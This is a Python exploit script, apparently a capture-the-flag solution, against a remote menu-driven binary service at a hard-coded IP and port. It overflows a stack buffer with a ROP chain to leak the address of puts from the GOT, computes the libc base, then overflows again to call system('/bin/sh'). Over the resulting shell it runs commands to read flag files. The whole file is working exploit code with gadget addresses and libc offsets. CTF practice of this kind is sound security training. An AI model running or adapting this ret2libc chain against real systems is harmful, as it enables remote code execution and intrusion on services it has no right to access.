#!/usr/bin/env python3
import socket
import struct
import sys
import time


HOST = "154.57.164.82"
PORT = 31909

# Non-PIE binary addresses.
POP_RDI = 0x4010A3       # pop rdi; ret (inside the CSU epilogue)
RET = 0x40063E           # ret
PUTS_PLT = 0x400650
PUTS_GOT = 0x601FA8
MAIN = 0x400F68

# Offsets in the supplied libc.so.6.
PUTS = 0x80AA0
SYSTEM = 0x4F550
BIN_SH = 0x1B3E1A


def p64(value):
    return struct.pack("<Q", value)


def recv_until(sock, needle, timeout=8):
    sock.settimeout(timeout)
    data = bytearray()
    while needle not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(f"connection closed waiting for {needle!r}")
        data += chunk
    return bytes(data)


def choose_fill(sock):
    recv_until(sock, b"2. Drink something")
    sock.sendall(b"1\n")
    recv_until(sock, b"You can also order something else.")


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    with socket.create_connection((host, port), timeout=8) as sock:
        # Leak puts from the GOT, then restart main for a second overflow.
        choose_fill(sock)
        stage1 = b"A" * 40 + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)
        sock.sendall(stage1)

        output = recv_until(sock, b"2. Drink something")
        echo_end = b"A" * 40 + p64(POP_RDI)[:3]
        try:
            leak_line = output.split(echo_end, 1)[1].split(b"\n", 1)[0]
        except IndexError as exc:
            raise RuntimeError(f"could not isolate libc leak from {output!r}") from exc
        leak = struct.unpack("<Q", leak_line[:8].ljust(8, b"\0"))[0]
        print(f"[+] raw leak:   {leak_line.hex()}")
        libc = leak - PUTS
        print(f"[+] puts leak:  {leak:#x}")
        print(f"[+] libc base:  {libc:#x}")

        # Stack-align, load /bin/sh into RDI, and invoke system.
        sock.sendall(b"1\n")
        recv_until(sock, b"You can also order something else.")
        stage2 = (
            b"A" * 40
            + p64(RET)
            + p64(POP_RDI)
            + p64(libc + BIN_SH)
            + p64(libc + SYSTEM)
        )
        sock.sendall(stage2)
        time.sleep(0.2)
        sock.sendall(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; echo __DONE__\n")
        result = recv_until(sock, b"__DONE__", timeout=8)
        print(result.decode("latin-1", errors="replace"))


if __name__ == "__main__":
    main()
